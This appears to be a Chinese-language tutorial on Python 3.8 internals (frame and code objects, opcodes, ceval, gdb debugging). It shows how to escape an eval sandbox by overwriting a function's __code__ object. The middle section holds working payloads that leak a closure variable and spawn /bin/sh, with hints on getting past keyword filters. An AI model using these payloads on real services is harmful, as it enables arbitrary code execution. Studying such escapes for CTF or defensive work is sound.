# Python Opcode逃逸笔记

不同版本python的PyCodeObject参数数量有一定差异，但大同小异，本文在Python3.8环境下进行探索

### PyFrameObject <a id="toc-0"></a>

在Python里，一切皆对象，函数也不例外

Python虚拟机的执行环境基于PyFrameObject栈帧，一个线程有一个栈帧链，在栈帧环境中根据执行PyCodeObject对象，从中取出对应的字节码序列在执行机中执行。

栈帧构造如下

```c
struct _frame {
    PyObject_VAR_HEAD
    struct _frame *f_back;      /* previous frame, or NULL */
    PyCodeObject *f_code;       /* code segment */
    PyObject *f_builtins;       /* builtin symbol table (PyDictObject) */
    PyObject *f_globals;        /* global symbol table (PyDictObject) */
    PyObject *f_locals;         /* local symbol table (any mapping) */
    PyObject **f_valuestack;    /* points after the last local */
    /* Next free slot in f_valuestack.  Frame creation sets to f_valuestack.
       Frame evaluation usually NULLs it, but a frame that yields sets it
       to the current stack top. */
    PyObject **f_stacktop;
    PyObject *f_trace;          /* Trace function */
    char f_trace_lines;         /* Emit per-line trace events? */
    char f_trace_opcodes;       /* Emit per-opcode trace events? */

    /* Borrowed reference to a generator, or NULL */
    PyObject *f_gen;

    int f_lasti;                /* Last instruction if called */
    /* Call PyFrame_GetLineNumber() instead of reading this field
       directly.  As of 2.3 f_lineno is only valid when tracing is
       active (i.e. when f_trace is set).  At other times we use
       PyCode_Addr2Line to calculate the line from the current
       bytecode index. */
    int f_lineno;               /* Current line number */
    int f_iblock;               /* index in f_blockstack */
    char f_executing;           /* whether the frame is still executing */
    PyTryBlock f_blockstack[CO_MAXBLOCKS]; /* for try and loop blocks */
    PyObject *f_localsplus[1];  /* locals+stack, dynamically sized */
};
```

### PyCodeObject <a id="toc-1"></a>

先来看看python中CODE对象的构造

\(不同版本python有一定区别，新版本加入了几个新的强制参数\)

```yaml
print(dir((lambda: 0).__code__))
'''
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_kwonlyargcount', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_posonlyargcount', 'co_stacksize', 'co_varnames', 'replace']
'''
```

统计必要参数数量，这个地方不同版本的python会有所差异。

```c
li = [i for i in dir((lambda: 0).__code__) if not i.startswith('__')]
len(li)
#17
```

去看下CPython中相关的[实现](https://github.com/python/cpython/blob/4a21e57fe55076c77b0ee454e1994ca544d09dc0/Objects/codeobject.c)

其中有关PyCode对象的新建

```c
PyCodeObject *
PyCode_New(int argcount, int kwonlyargcount,
           int nlocals, int stacksize, int flags,
           PyObject *code, PyObject *consts, PyObject *names,
           PyObject *varnames, PyObject *freevars, PyObject *cellvars,
           PyObject *filename, PyObject *name, int firstlineno,
           PyObject *lnotab)
{
    return PyCode_NewWithPosOnlyArgs(argcount, 0, kwonlyargcount, nlocals,
                                     stacksize, flags, code, consts, names,
                                     varnames, freevars, cellvars, filename,
                                     name, firstlineno, lnotab);
}
......
PyDoc_STRVAR(code_doc,
"code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n\
      flags, codestring, constants, names, varnames, filename, name,\n\
      firstlineno, lnotab[, freevars[, cellvars]])\n\
\n\
Create a code object.  Not for the faint of heart.");
```

据此构造在python中利用类型方法构造出一个对应的`__code__`对象改写原函数对象的逻辑

```c
def a():
    if 1 == 2:
        print("flag{233}")

print("Opcode of a():",a.__code__.co_code.hex())
print("CONST of a():",a.__code__.co_consts)
#打印所有参数即对应值
print("ALL of a():")
for name in dir(a.__code__):
    print(name,getattr(a.__code__,name))
#构造newcode
def b():
    if 1 != 2:
        print("flag{233}")
print("Opcode of b():",b.__code__.co_code.hex())
code=b.__code__.co_code
newcode = type(a.__code__)
code =newcode(0,0,0,0,2,67, code,(None, 1, 2, 'flag{0w0}'),('print',),(), "", "a",1, b'\x00\x01\x08\x01')
a.__code__ = code
a()
```

整理一下这些参数的作用[文档](https://docs.python.org/3/reference/datamodel.html#index-56)

看文档不如看源码

```c
//https://github.com/python/cpython/blob/master/Include/cpython/code.h
/* Bytecode object */
struct PyCodeObject {
    PyObject_HEAD
    int co_argcount;            /* #arguments, except *args */
    int co_posonlyargcount;     /* #positional only arguments */
    int co_kwonlyargcount;      /* #keyword only arguments */
    int co_nlocals;             /* #local variables */
    int co_stacksize;           /* #entries needed for evaluation stack */
    int co_flags;               /* CO_..., see below */
    int co_firstlineno;         /* first source line number */
    PyObject *co_code;          /* instruction opcodes */
    PyObject *co_consts;        /* list (constants used) */
    PyObject *co_names;         /* list of strings (names used) */
    PyObject *co_varnames;      /* tuple of strings (local variable names) */
    PyObject *co_freevars;      /* tuple of strings (free variable names) */
    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */
    /* The rest aren't used in either hash or comparisons, except for co_name,
       used in both. This is done to preserve the name and line number
       for tracebacks and debuggers; otherwise, constant de-duplication
       would collapse identical functions/lambdas defined on different lines.
    */
    Py_ssize_t *co_cell2arg;    /* Maps cell vars which are arguments. */
    PyObject *co_filename;      /* unicode (where it was loaded from) */
    PyObject *co_name;          /* unicode (name, for reference) */
    PyObject *co_lnotab;        /* string (encoding addr<->lineno mapping) See
                                   Objects/lnotab_notes.txt for details. */
    void *co_zombieframe;       /* for optimization only (see frameobject.c) */
    PyObject *co_weakreflist;   /* to support weakrefs to code objects */
    /* Scratch space for extra data relating to the code object.
       Type is a void* to keep the format private in codeobject.c to force
       people to go through the proper APIs. */
    void *co_extra;

    /* Per opcodes just-in-time cache
     *
     * To reduce cache size, we use indirect mapping from opcode index to
     * cache object:
     *   cache = co_opcache[co_opcache_map[next_instr - first_instr] - 1]
     */

    // co_opcache_map is indexed by (next_instr - first_instr).
    //  * 0 means there is no cache for this opcode.
    //  * n > 0 means there is cache in co_opcache[n-1].
    unsigned char *co_opcache_map;
    _PyOpcache *co_opcache;
    int co_opcache_flag;  // used to determine when create a cache.
    unsigned char co_opcache_size;  // length of co_opcache.
};
```

整理出表格

| 属性 | 描述 |
| :--- | :--- |
| `co_argcount` | 位置参数总数（包括仅位置参数和具有默认值的参数） |
| `co_posonlyargcount` | 仅位置参数（包括具有默认值的参数）的数量 |
| `co_kwonlyargcount` | 仅关键字参数（包括具有默认值的参数）的数量 |
| `co_nlocals` | 函数使用的局部变量的数量（包括参数） |
| `co_stacksize` | 所需的堆栈大小 |
| `co_flags` | 存放着函数的组合布尔标志位\([Code Objects Bit Flags](https://docs.python.org/3/library/inspect.html#code-objects-bit-flags)\) |
| `co_code` | 二进制格式的字节码\([Bytecode Instructions](https://xz.aliyun.com/t/Python%20Bytecode%20Instructions)\) |
| `co_consts` | 常量列表 |
| `co_names` | 字符串列表 |
| `co_varnames` | 包含局部变量名称的元组（以参数名称开头） |
| `co_filename` | 代码文件名称 |
| `co_name` | 函数名称 |
| `co_firstlineno` | 函数的第一行号 |
| `co_lnotab` | 编码从字节码偏移量到行号的映射 |
| `co_freevars`\* | 包含自由变量名称的元组 |
| `co_cellvars`\* | 包含嵌套函数引用的局部变量的名称 |

保证参数对接能够一致不出错的前提下，可以自由修改这些参数

接下来演示另一个具有`freevars`的样例

```c
def target(flag):
    def printflag():
        if flag == "":
            print (flag)
    return printflag
flag = target("flag{2333}")
eval(input(">"))
flag()
```

构造\_\_code\_\_对象

```c
def a(flag):
    def printflag():
        if flag != "":
            print (flag)
    return printflag
target=a("xxx")
code="flag.__code__=type(target.__code__)({},{},{},{},{},{},bytes.fromhex('{}'),{},{},{},\'{}\',\'{}\',{},bytes.fromhex(\'{}\'),{},{})\n".format(
     target.__code__.co_argcount,\
     target.__code__.co_posonlyargcount,\
     target.__code__.co_kwonlyargcount,\
     target.__code__.co_nlocals,\
     target.__code__.co_stacksize,\
     target.__code__.co_flags,\
     target.__code__.co_code.hex(),\
     target.__code__.co_consts,\
     target.__code__.co_names, \
     target.__code__.co_varnames,\
     target.__code__.co_filename,\
     target.__code__.co_name,\
     target.__code__.co_firstlineno,\
     target.__code__.co_lnotab.hex(),\
     target.__code__.co_freevars,\
     target.__code__.co_cellvars)
print(code)
'''
result:
flag.__code__ =type(target.__code__)(0,0,0,0,2,19,bytes.fromhex('880064016b037210740088008301010064005300'),(None,'', ''),('print',),(),'newcode.py','printflag',2,bytes.fromhex('00010801'),('flag',),())
'''
```

```bash
py example2.py
>flag.__code__=type(target.__code__)(0,0,0,0,2,19,bytes.fromhex('880064016b037210740088008301010064005300'),(None, ''),('print',),(),'newcode.py','printflag',2,bytes.fromhex('00010801'),('flag',),())
flag{2333}
```

可以看到这里通过覆盖修改原函数的`__code__`对象使其成功输出了原函数域内的变量flag，此外，这里由于只接受一次输入，把这个过程压缩在一行里，也可以用一个while循环达成无限次数的输入，但有些时候也可能并没有这样一个继续交互的机会

```c
while True:    exec(input())
'''
    >....
    >break
'''
```

实际上利用`__code__`对象完全可以执行任意操作码\(opcode\) ，比如我们构造一个通过`os`模块`getshell`的对象

```python
def target():
    import os
    os.system("/bin/sh")
...
#稍微整理得到
flag.__code__ =type(target.__code__)(0,0,0,1,3,67,bytes.fromhex('640164006c007d007c00a0016402a101010064005300'),(None, 0, '/bin/sh'),('os', 'system'),('os',),'newcode.py','target',8,bytes.fromhex('00010801'),('flag',),())
```

输入上面的样例就会运行shell，当然，os和system肯定是被过滤的关键词，但这里字符串形式的关键词想必大家也有各种编码和拼接的办法来绕过过滤的

当然，这样还是依赖`os`模块

不过由上面的例子我们可以理解，通过构造`__code__`，我们完全可以按自己的想法执行任意的opcode而没什么约束，从而通过opcode达成外部任意读写从而为所欲为

### Opcode操作码 <a id="toc-2"></a>

python的文本源码经过ast分析与有限的优化后转化成最终的字节码，pyc文件

字节流形式的执行码称之为字节码，而每个字节码有个对应的可理解的符号形式，称其为opcode操作码，通过opcode库我们可以从opcode得到bytecode，而通过dis库，可以将byetecode转化成opcode的可阅读形式

二者关系有如汇编与二进制

```python
>>> from opcode import opmap
>>> import dis
>>> chr(opmap['LOAD_CONST'])
'd'
>>> dis.dis('d')
  1           0 LOAD_NAME                0 (d)
              2 RETURN_VALUE
>>> dis.dis(bytes.fromhex('880064016b037210740088008301010064005300'))
          0 LOAD_DEREF               0 (0)
        #将 func.__closure__[i] (闭包变量) 取出并压入栈
          2 LOAD_CONST               1 (1)
        #将 co_consts[i] 压入栈
          4 COMPARE_OP               3 (!=)
        #根据opname进行布尔运算
          6 POP_JUMP_IF_FALSE       16
        #为假则跳转到第16行
          8 LOAD_GLOBAL              0 (0)
        #将 co_names[namei] 压入栈 
         10 LOAD_DEREF               0 (0)
         12 CALL_FUNCTION            1
        #函数调用，弹出所需参数，返回值压栈
         14 POP_TOP
        #弹出(丢弃)栈顶元素
         16 LOAD_CONST               0 (0)
         18 RETURN_VALUE
        #退出栈帧
```

由于opcode有一百多个，直接贴 [文档](https://docs.python.org/zh-cn/3/library/dis.html#dis.Instruction)，一些常用的操作有

**读写指令**

| 指令名 | 操作 |
| :--- | :--- |
| LOAD\_GLOBAL | 从co\_names\[namei\]入栈 |
| STORE\_GLOBAL | 出栈到co\_names\[namei\] |
| LOAD\_FAST | 从co\_varnames\[var\_num\]入栈 |
| STORE\_FAST | 出栈到co\_varnames\[var\_num\] |
| LOAD\_CONST | 从co\_consts\[consti\]入栈 |

**控制指令**

| 指令名 | 操作 |
| :--- | :--- |
| CALL\_FUNCTION | 函数调用，弹出所需参数，新栈帧，返回值压栈 |
| RETURN\_VALUE | 函数返回，退出栈帧 |
| POP\_JUMP\_IF\_FALSE | 当条件为假的时候跳转 |
| JUMP\_FORWARD | 直接跳转 |

**布尔运算**

**COMPARE\_OP**

```text
cmp_op = ('<', '<=', '==', '!=', '>', '>=', 'in', 'not in', 'is','is not', 'exception match', 'BAD')
```

不同的操作码对应了不同的操作，在[Python/ceval.c](https://github.com/python/cpython/blob/b5cc2089cc354469f12eabc7ba54280e85fdd6dc/Python/ceval.c)中的switch里定义了对应的一系列虚拟机操作，构成了Python虚拟机的执行核心。

```python
switch (opcode) {

        /* BEWARE!
           It is essential that any operation that fails must goto error
           and that all operation that succeed call [FAST_]DISPATCH() ! */

        case TARGET(NOP): {
            FAST_DISPATCH();
        }

        case TARGET(LOAD_FAST): {
            PyObject *value = GETLOCAL(oparg);
            if (value == NULL) {
                format_exc_check_arg(tstate, PyExc_UnboundLocalError,
                                     UNBOUNDLOCAL_ERROR_MSG,
                                     PyTuple_GetItem(co->co_varnames, oparg));
                goto error;
            }
            Py_INCREF(value);
            PUSH(value);
            FAST_DISPATCH();
        }
        ...
}
```

而具体的opcode在 [opcode.h](https://github.com/python/cpython/blob/master/Include/opcode.h) 进行了定义，可以在其中看到所有的opcode，修改调换其中字节码的值再编译即可达成混淆字节码的目的，当然，直接编译是不行的，因为opcode还在[opcode\_targets.h](https://github.com/python/cpython/blob/master/Python/opcode_targets.h)与 [opcode.py](https://github.com/python/cpython/blob/master/Lib/opcode.py) 进行了定义，需要保证三者opcode定义上的一致性。

根据上述内容，我们甚至可以拓展opcode，加入一些我们自定义的花指令提高python逆向的难度，不过这不是本文讨论的重点。

### Python debug环境 <a id="toc-3"></a>

#### 编译debug版本python <a id="toc-4"></a>

```python
$ git clone https://github.com/python/cpython
$ cd cpython
$ sudo apt install build-essential
$ sudo apt install libssl-dev zlib1g-dev libncurses5-dev \
  libncursesw5-dev libreadline-dev libsqlite3-dev libgdbm-dev \
  libdb5.3-dev libbz2-dev libexpat1-dev liblzma-dev libffi-dev
$ ./configure --with-pydebug
$ make -j2 -s
```

debug版本代码编译前可能需要根据具体情况做些调整

#### gdb调试python <a id="toc-5"></a>

python-dbg中包含了调试符号并把libpython.py工具安装到gdb的auto-load下

```text
sudo apt-get install gdb python-dbg
```

不同版本的libpython.py存放在`https://github.com/python/cpython/tree/<version>/Tools/gdb`，可以手动安装对应版本的libpython.py

安装后即可通过交互式方式从gdb启动python进程

```text
$ gdb python
...
(gdb) run <programname>.py <arguments>
```

或通过快速方式

```text
$ gdb -ex r --args python <programname>.py <arguments>
```

或是attach到现有进程

```text
$ gdb python <pid of running process>
```

加载core file

```text
$ gdb python core.PID
```

常用指令

```text
py-bt #当前位置的调用栈
py-down #查看下层调用方的信息
py-locals #查看变量的值
py-up #查看上层调用方的信息
python-interactive
py-bt-full
py-list #当前执行位置的源码
py-print
python
```

准备好前置知识与调试环境，就可以在python虚拟机里愉快玩耍啦。

